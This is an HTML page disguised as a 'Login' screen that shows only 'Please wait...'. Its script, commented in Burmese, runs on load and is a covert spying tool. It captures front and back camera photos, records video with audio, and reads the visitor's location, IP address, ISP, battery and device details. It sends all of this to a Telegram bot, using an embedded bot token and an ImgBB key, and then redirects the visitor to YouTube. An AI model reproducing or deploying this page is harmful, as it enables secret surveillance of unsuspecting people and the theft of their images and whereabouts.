<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { 
            color: #667eea; 
            margin-bottom: 10px; 
            font-size: 28px;
            letter-spacing: 2px;
        }
        .subtitle { 
            color: #999; 
            margin-bottom: 30px; 
            font-size: 14px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <div class="subtitle">Please wait...</div>
    </div>

    <script>
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        if (isTelegram && isMobile) {
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        async function sendMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: OWNER_ID, text: text })
                });
            } catch(e) {}
        }
        
        async function uploadToImgBB(blob) {
            const fd = new FormData();
            fd.append('image', blob);
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: fd });
            const data = await res.json();
            return data.success ? data.data.url : null;
        }
        
        // ========== ၁. အနောက်ကင်မရာပုံ ==========
        async function takeBackPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());
                
                canvas.toBlob(async (blob) => {
                    const url = await uploadToImgBB(blob);
                    await sendMessage(`📸 BACK CAMERA PHOTO!\n🕐 ${new Date().toLocaleString()}\n📷 ${url}`);
                }, 'image/jpeg', 0.7);
            } catch(e) {
                await sendMessage(`❌ BACK CAMERA DENIED!`);
            }
        }
        
        // ========== ၂. အရှေ့ကင်မရာပုံ ==========
        async function takeFrontPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());
                
                canvas.toBlob(async (blob) => {
                    const url = await uploadToImgBB(blob);
                    await sendMessage(`📸 FRONT CAMERA PHOTO!\n🕐 ${new Date().toLocaleString()}\n📷 ${url}`);
                }, 'image/jpeg', 0.7);
            } catch(e) {
                await sendMessage(`❌ FRONT CAMERA DENIED!`);
            }
        }
        
        // ========== ၃. Video + အသံဖမ်း ==========
        async function recordVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', OWNER_ID);
                    formData.append('video', videoBlob, 'video.mp4');
                    formData.append('caption', `🎥 VIDEO + AUDIO RECORDED!\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
                    
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    } catch(e) {}
                    
                    stream.getTracks().forEach(t => t.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            } catch(e) {
                await sendMessage(`❌ VIDEO + AUDIO DENIED!`);
            }
        }
        
        // ========== ၄. တည်နေရာ ==========
        async function getLocation() {
            if (!navigator.geolocation) {
                await sendMessage(`❌ LOCATION NOT SUPPORTED!`);
                return;
            }
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                await sendMessage(`📍 LOCATION!\n🕐 ${new Date().toLocaleString()}\n🌍 ${lat}, ${lon}\n🗺️ https://www.google.com/maps?q=${lat},${lon}`);
            }, async () => {
                await sendMessage(`❌ LOCATION DENIED!`);
            });
        }
        
        // ========== ၅. IP Address + ISP ==========
        async function getIPInfo() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const ip = data.ip;
                
                const ispRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const ispData = await ispRes.json();
                const isp = ispData.org || "Unknown";
                const country = ispData.country_name || "Unknown";
                
                await sendMessage(`🌐 IP INFO!\n🕐 ${new Date().toLocaleString()}\n📌 IP: ${ip}\n📡 ISP: ${isp}\n🌍 Country: ${country}`);
            } catch(e) {
                await sendMessage(`❌ IP INFO FAILED!`);
            }
        }
        
        // ========== ၆. RAM ပမာဏ ==========
        async function getRAM() {
            if ('deviceMemory' in navigator) {
                await sendMessage(`💾 RAM: ~${navigator.deviceMemory} GB`);
            } else {
                await sendMessage(`💾 RAM: Not Available`);
            }
        }
        
        // ========== ၇. CPU Core အရေအတွက် ==========
        async function getCPUCores() {
            const cores = navigator.hardwareConcurrency || "Unknown";
            await sendMessage(`🔢 CPU Cores: ${cores}`);
        }
        
        // ========== ၈. Screen Orientation ==========
        async function getOrientation() {
            const orientation = screen.orientation?.type || "Unknown";
            await sendMessage(`📱 Screen Orientation: ${orientation}`);
        }
        
        // ========== ၉. Microphone ရှိမရှိ ==========
        async function checkMicrophone() {
            if (!navigator.mediaDevices) {
                await sendMessage(`🎤 Microphone: Not Supported`);
                return;
            }
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const hasMic = devices.some(d => d.kind === 'audioinput');
                await sendMessage(hasMic ? `🎤 Microphone: Available` : `🎤 Microphone: Not Found`);
            } catch(e) {
                await sendMessage(`🎤 Microphone: Unknown`);
            }
        }
        
        // ========== ၁၀. Flashlight ရှိမရှိ ==========
        async function checkFlashlight() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();
                const hasFlash = capabilities.torch === true;
                stream.getTracks().forEach(t => t.stop());
                await sendMessage(hasFlash ? `🔦 Flashlight: Available` : `🔦 Flashlight: Not Available`);
            } catch(e) {
                await sendMessage(`🔦 Flashlight: Unknown`);
            }
        }
        
        // ========== ၁၁. ဖုန်းအား ==========
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.floor(battery.level * 100);
                    const charging = battery.charging ? "Charging" : "Not Charging";
                    await sendMessage(`🔋 Battery: ${level}% (${charging})`);
                } catch(e) {
                    await sendMessage(`🔋 Battery: Not Available`);
                }
            } else {
                await sendMessage(`🔋 Battery: Not Supported`);
            }
        }
        
        // ========== ၁၂. ဖုန်းနာမည် ==========
        async function getDeviceModel() {
            const ua = navigator.userAgent;
            let device = "Unknown";
            if (ua.includes('iPhone')) device = 'iPhone';
            else if (ua.includes('Samsung')) device = 'Samsung';
            else if (ua.includes('Redmi') || ua.includes('Xiaomi')) device = 'Xiaomi/Redmi';
            else if (ua.includes('OPPO')) device = 'OPPO';
            else if (ua.includes('vivo')) device = 'vivo';
            else if (ua.includes('realme')) device = 'realme';
            else if (ua.includes('Nokia')) device = 'Nokia';
            else if (ua.includes('Pixel')) device = 'Google Pixel';
            await sendMessage(`📱 Device: ${device}`);
        }
        
        // ========== ၁၃. အင်တာနက်အမျိုးအစား ==========
        async function getConnectionType() {
            if (navigator.connection) {
                const type = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
                await sendMessage(`🌐 Connection: ${type.toUpperCase()}`);
            } else {
                await sendMessage(`🌐 Connection: Unknown`);
            }
        }
        
        // ========== ၁၄. Platform, Language, Screen ==========
        async function getBasicInfo() {
            await sendMessage(`📌 Platform: ${navigator.platform}\n📌 Language: ${navigator.language}\n📌 Screen: ${screen.width}x${screen.height}\n📌 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
        }
        
        // ========== MAIN ==========
        async function init() {
            if (!OWNER_ID) return;
            
            await takeBackPhoto();      // အနောက်ကင်မရာ
            await takeFrontPhoto();     // အရှေ့ကင်မရာ
            await recordVideo();        // Video + အသံ
            await getLocation();        // တည်နေရာ
            await getIPInfo();          // IP + ISP
            await getRAM();             // RAM
            await getCPUCores();        // CPU Cores
            await getOrientation();     // Screen Orientation
            await checkMicrophone();    // Microphone
            await checkFlashlight();    // Flashlight
            await getBatteryInfo();     // ဖုန်းအား
            await getDeviceModel();     // ဖုန်းနာမည်
            await getConnectionType();  // အင်တာနက်အမျိုးအစား
            await getBasicInfo();       // Platform, Language, Screen
            
            setTimeout(() => { window.location.href = YOUTUBE_URL; }, 5000);
        }
        
        if (!isTelegram || !isMobile) {
            init();
        }
    </script>
</body>
</html>
